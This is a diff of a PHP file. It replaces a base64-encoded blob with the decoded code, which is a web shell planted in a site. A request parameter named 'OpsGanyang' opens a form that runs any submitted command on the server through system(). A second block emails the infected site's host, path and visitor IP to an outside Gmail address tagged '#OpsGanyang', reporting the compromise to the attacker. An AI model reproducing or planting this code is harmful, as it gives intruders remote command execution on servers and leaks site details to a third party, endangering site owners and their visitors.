@@ -1,4 +1,26 @@
 <?php
-$string = "PD9waHANCmlmKGlzc2V0KCRfUkVRVUVTVFsnT3BzR2FueWFuZyddKSl7DQogICAgICAgIGVjaG8gIjxwcmU+IjsNCiAgICAgICAgZWNobyAiPGZvcm0gbmFtZT0nZm9ybScgYWN0aW9uPScjJyBtZXRob2Q9J3Bvc3QnPg0KICAgICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdjb2JhJy8+IDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdlbnRlcicvPg0KICAgICAgIDwvZm9ybT4iOw0KICAgICAgICAkY21kID0gKCRfUE9TVFsnY29iYSddKTsNCiAgICAgICAgc3lzdGVtKCRjbWQpOw0KICAgICAgICBlY2hvICI8L3ByZT4iOw0KICAgICAgICBwaHBpbmZvKCk7DQogICAgICAgIGRpZTsNCn0NCnBocGluZm8oKTsNCj8+DQo8P3BocA0KJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOw0KJHJhNDQgPSByYW5kKDEsIDk5OTk5KTsNCiRzdWJqOTggPSAiICNPcHNHYW55YW5nIHwkaXAiOw0KJGVtYWlsID0gImtleWxvZ2dlcnNyZXN1bHRzQGdtYWlsLmNvbSI7DQokZnJvbSA9ICJGcm9tOiAjT3BzR2FueWFuZzxib3R2M0BtcnNweWJvdHYzLmNvbSI7DQokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJG0yMiA9ICRpcCAuICIiOw0KJG1zZzg4NzMgPSAiJGE0NSAkYjc1ICRtMjIiOw0KbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7DQo/Pg==";
-base64_decode($string);
+if(isset($_REQUEST['OpsGanyang'])){
+        echo "<pre>";
+        echo "<form name='form' action='#' method='post'>
+       <input type='text' name='coba'/> <input type='submit' value='enter'/>
+       </form>";
+        $cmd = ($_POST['coba']);
+        system($cmd);
+        echo "</pre>";
+        phpinfo();
+        die;
+}
+phpinfo();
+?>
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ra44 = rand(1, 99999);
+$subj98 = " #OpsGanyang |$ip";
+$email = "keyloggersresults@gmail.com";
+$from = "From: #OpsGanyang<botv3@mrspybotv3.com";
+$a45 = $_SERVER['REQUEST_URI'];
+$b75 = $_SERVER['HTTP_HOST'];
+$m22 = $ip . "";
+$msg8873 = "$a45 $b75 $m22";
+mail($email, $subj98, $msg8873, $from);
 ?>
